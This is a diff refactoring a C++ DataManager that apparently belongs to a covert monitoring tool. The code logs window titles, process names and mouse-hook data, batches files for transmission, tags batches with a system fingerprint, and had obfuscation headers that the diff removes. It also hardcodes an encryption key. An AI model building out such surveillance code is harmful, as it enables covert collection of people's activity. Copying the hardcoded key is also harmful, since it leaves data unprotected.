@@ -1,26 +1,21 @@
 #include "data/DataManager.h"
 #include "core/Logger.h"
-#include "security/Encryption.h"
-#include "security/Obfuscation.h"
-#include "utils/TimeUtils.h"
-#include "utils/FileUtils.h"
 #include "utils/SystemUtils.h"
-#include "utils/StringUtils.h"
 #include <algorithm>
 #include <sstream>
 #include <chrono>   
-#include <thread>
 #include <iomanip>
 #include <vector>
 #include <cstdint>
 #include <string>
-#include <cstring>  // Added for strftime
-#include <ctime>    // Added for std::localtime
+#include <cstring>
+#include <ctime>
 
 // Platform-specific includes
 #if PLATFORM_WINDOWS
 #include <windows.h>
 #include <fileapi.h>
+#include <sys/stat.h>
 #else
 #include <dirent.h>
 #include <sys/types.h>
@@ -28,18 +23,15 @@
 #include <unistd.h>
 #endif
 
-// Simple alternative to obfuscation
-static const char* OBF_DATA_MANAGER = "DataManager";
-
 // Forward declaration for Configuration if not available
 class Configuration {
 public:
-    size_t GetMaxFileSize() const { return 10 * 1024 * 1024; } // 10MB default
-    std::string GetEncryptionKey() const { return "default-encryption-key"; }
+    static size_t GetMaxFileSize() { return 10 * 1024 * 1024; } // 10MB default
+    [[nodiscard]] static std::string GetEncryptionKey() { return "default-encryption-key"; }
 };
 
 DataManager::DataManager(Configuration* config)
-    : m_config(config), m_maxBufferSize(config->GetMaxFileSize()) {
+    : m_config(config), m_maxBufferSize(Configuration::GetMaxFileSize()) {
     InitializeStorage();
 }
 
@@ -128,8 +120,7 @@ std::vector<uint8_t> DataManager::RetrieveEncryptedData() {
     
     for (const auto& file : dataFiles) {
         // Read file data (simplified implementation)
-        FILE* f = fopen(file.c_str(), "rb");
-        if (f) {
+        if (FILE* f = fopen(file.c_str(), "rb")) {
             fseek(f, 0, SEEK_END);
             long size = ftell(f);
             fseek(f, 0, SEEK_SET);
@@ -178,7 +169,7 @@ std::vector<uint8_t> DataManager::RetrieveEncryptedData() {
     finalData.insert(finalData.end(), allData.begin(), allData.end());
     
     // Encrypt all data (simplified)
-    std::string encryptionKey = m_config->GetEncryptionKey();
+    std::string encryptionKey = Configuration::GetEncryptionKey();
     // In a real implementation, you would call your encryption library here
     std::vector<uint8_t> encryptedData = finalData; // Placeholder
     
@@ -202,8 +193,7 @@ void DataManager::ClearData() {
         FindClose(hFind);
     }
 #else
-    DIR* dir = opendir(m_storagePath.c_str());
-    if (dir) {
+    if (DIR* dir = opendir(m_storagePath.c_str())) {
         struct dirent* entry;
         while ((entry = readdir(dir)) != nullptr) {
             std::string filename = entry->d_name;
@@ -276,15 +266,13 @@ void DataManager::FlushSystemEvents() {
 }
 
 void DataManager::AppendToFile(const std::string& path, const std::string& data) {
-    FILE* f = fopen(path.c_str(), "ab");
-    if (f) {
+    if (FILE* f = fopen(path.c_str(), "ab")) {
         fwrite(data.c_str(), 1, data.size(), f);
         fclose(f);
     }
     
     // Check file size and rotate if needed
-    FILE* fcheck = fopen(path.c_str(), "rb");
-    if (fcheck) {
+    if (FILE* fcheck = fopen(path.c_str(), "rb")) {
         fseek(fcheck, 0, SEEK_END);
         long size = ftell(fcheck);
         fclose(fcheck);
@@ -336,8 +324,7 @@ std::vector<std::string> DataManager::GetDataFilesReadyForTransmission() {
         FindClose(hFind);
     }
 #else
-    DIR* dir = opendir(m_storagePath.c_str());
-    if (dir) {
+    if (DIR* dir = opendir(m_storagePath.c_str())) {
         struct dirent* entry;
         while ((entry = readdir(dir)) != nullptr) {
             std::string filename = entry->d_name;
@@ -356,8 +343,8 @@ std::vector<std::string> DataManager::GetDataFilesReadyForTransmission() {
             file.find(".transmitted") == std::string::npos) {
             
             // Check file modification time (simplified)
-            struct stat fileInfo;
-            if (::stat(file.c_str(), &fileInfo) == 0) {
+            struct stat fileInfo{};
+            if (stat(file.c_str(), &fileInfo) == 0) {
                 auto currentTime = std::chrono::system_clock::now();
                 auto modTime = std::chrono::system_clock::from_time_t(fileInfo.st_mtime);
                 auto elapsed = std::chrono::duration_cast<std::chrono::minutes>(
@@ -414,12 +401,11 @@ std::string DataManager::SystemInfoToString(const utils::SystemInfo& info) {
     return ss.str();
 }
 
-// Fixed: Added const qualifier
-std::string DataManager::SystemEventToString(const SystemEventData& event) const {
+std::string DataManager::SystemEventToString(const SystemEventData& event) {
     std::stringstream ss;
     ss << "SYSEVENT|" << event.timestamp << "|"
        << static_cast<int>(event.eventType) << "|"
-       << event.windowHandle << "|" // Add window handle
+       << event.windowHandle << "|"
        << event.windowTitle << "|" << event.processName << "|"
        << event.extraInfo << "\n";
     return ss.str();
@@ -476,13 +462,15 @@ std::vector<uint8_t> DataManager::GetBatchData() {
     return encryptedData;
 }
 
-std::string DataManager::GenerateBatchId() const {
+void DataManager::AddMouseData(const MouseHookData &mouse_data) {
+}
+
+std::string DataManager::GenerateBatchId() {
     auto now = std::chrono::system_clock::now();
     auto time = std::chrono::system_clock::to_time_t(now);
     std::stringstream ss;
     char timeStr[20];
-    std::tm* localTime = std::localtime(&time);
-    if (localTime) {
+    if (std::tm* localTime = std::localtime(&time)) {
         strftime(timeStr, sizeof(timeStr), "%Y%m%d_%H%M%S", localTime);
         ss << timeStr << "_system_fingerprint";
     } else {
